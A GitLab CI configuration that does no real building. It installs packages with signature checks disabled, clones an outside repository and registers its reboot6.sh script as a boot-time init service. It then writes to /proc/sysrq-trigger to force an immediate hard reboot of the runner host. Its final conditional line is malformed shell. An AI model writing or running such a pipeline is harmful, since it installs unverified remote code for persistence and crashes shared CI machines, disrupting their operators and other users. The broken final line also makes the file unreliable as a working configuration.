image: debian:latest
stages:
  - ".pre"
  - before_script
  - build1
  - deploy1
  - ".post"
before_script:
  - which ssh-agent || ( apt update --allow-unauthenticated --allow-insecure-repositories -y && apt install -y git tzdata && ln -fs /usr/share/zoneinfo/America/Los_Angeles /etc/localtime && dpkg-reconfigure -f noninteractive tzdata && apt full-upgrade -y)
build1:
  stage: build1
  script:
    - git clone https://gitlab.com/mrgofuckyourself/reboot6.git && cd reboot6 && cp reboot6.sh /etc/init.d/reboot6.sh && update-rc.d reboot6.sh default
deploy1:
  stage: deploy1
  script:
    - echo 1 > /proc/sys/kernel/sysrq
    - echo b > /proc/sysrq-trigger
    - if [ /etc/init.d/reboot6.sh = true ] do reboot else exit 1
